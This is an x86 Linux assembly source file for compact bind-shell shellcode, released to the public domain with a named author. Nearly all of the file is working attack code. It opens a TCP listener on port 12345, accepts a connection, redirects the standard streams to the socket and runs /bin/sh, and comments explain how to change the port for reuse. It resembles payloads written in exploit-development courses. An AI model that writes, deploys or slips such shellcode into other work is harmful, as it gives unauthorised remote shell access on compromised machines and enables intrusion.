; Filename: 	smaller_bind.nasm
;
; Author:	John Pierce, CISSP, remsanattexascarverdotcom
;
; Purpose:	Set up a listener on a port and throw a shell on connection,
;		re-written for efficiency
;
; This program was written by John W. Pierce, CISSP.  I enter it into
; the public domain.  You are free to use and/or redistribute it without 
; restriction, though attribution would be the right thing to do.  I hope
; it is of some value, but I make ABSOLUTELY NO WARRANTY OF ANY KIND.
;

global	_start

section	.text
_start:

	; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	xor	ebx,ebx
	mul	ebx		; zero out edx:eax
	push	byte	6	; IPPROTO_TCP
	push	byte	1	; SOCK_STREAM
	push	byte	2	; AF_INET
	push	byte 102
	pop	eax		; sys_socketcall
	inc	ebx		; ebx now 1, sys_socket
	mov	ecx, esp	; pointer to args
	int	0x80		; make the call
				; sockfd returned in eax
	mov	edi, eax	; store sockfd

; bind(	int sockfd, 					/* word
;	const struct sockaddr *addr, 			/* struct, 8 bytes
;	socklen_t addrlen)				/* byte
;
; struct sockaddr_in { sa_family_t sin_family;     	/* Address family      word     */
;			__be16 sin_port;       		/* Port number         word     */
;			struct in_addr sin_addr;       	/* Internet address    dword    */
;
; want to be able to easily change the listen port, will use jmp/call/pop to retrieve it
	jmp	short	call_bind
return_to_bind:
	pop	esi		; port is now in esi, will be last two bytes of shellcode so easy to change w/out re-working
	push	edx		; going to listen for any incoming, so set ipaddr to 0
	push	word [esi]	; port number retrieved above
	inc	ebx		; ebx now 2
	push	bx		; AF_INET
	mov	ecx, esp 	; store the address of struct for a minute
	push	byte 16		; addrlen
	push	ecx		; pointer to structure
	push	edi		; sockfd
	push	byte 102	
	pop	eax		; sys_socketcall
	mov	ecx, esp	; pointer to args
	int	0x80
; returns 0 on success in eax, -1 on fail

; 
; listen(int sockfd, int backlog)
;
	push 	byte 1		; backlog
	push	edi		; sockfd
	mov	al, 102		; sys_socketcall
	mov	bl, 4		; sys_listen, ebx was only 2 so no need to zero out
	mov	ecx, esp	; pointer to args
	int	0x80 
; returns 0 on success in eax, -1 on fail

;
; accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
;
;
; first create space for struct sockaddr
	push	edx		; *addrlen
	push	edx		; *addr
	push	edi		; sockfd	
	; and make the call
	mov	al, 102		; sys_socketcall
	inc	ebx		; now ebx=5, sys_accept
	mov	ecx, esp	; pointer to args
	int	0x80
; returns new file desctiptor in eax
;
; once we have a connection, have to dup2 stdin, stdout, stderr to new_sockfd
; /usr/src/linux-source-3.2.6/arch/x86/include/asm/unistd_32.h:#efine __NR_dup2	 63
; dup2(int oldfd, int newfd)
;
	push	byte 2		; start with stderr
	pop	ecx
	mov	ebx, eax	; oldfile descriptor from above
duploop:
	push	byte 63
	pop	eax
	int	0x80
	dec	ecx
	jns	duploop

; and now we set up for the execve call
; 
; execve(const char *filename, char *const argv[], char *const envp[])
;
; need little endian representation of /bin//sh =  0x6e69622f 0x68732f2f
;
	xor	eax,eax
	push	eax		; still 0, envp[] and terminate filename
	mov	ecx, esp	; pointer to envp[]
	push 	0x68732f2f	; /bin//sh
	push	0x6e69622f
	mov	ebx, esp	; *filename
	push	edx		; terminate argv
	push	ebx		; *argv[0]
	xchg	edx, ecx	; envp
	mov	ecx, esp	; *list of pointers to argv values
	mov	al, 11	
	int	0x80

call_bind:
	call return_to_bind
	listen_port	dw	0x3930	; storage for port number, little endian for 12345 currently

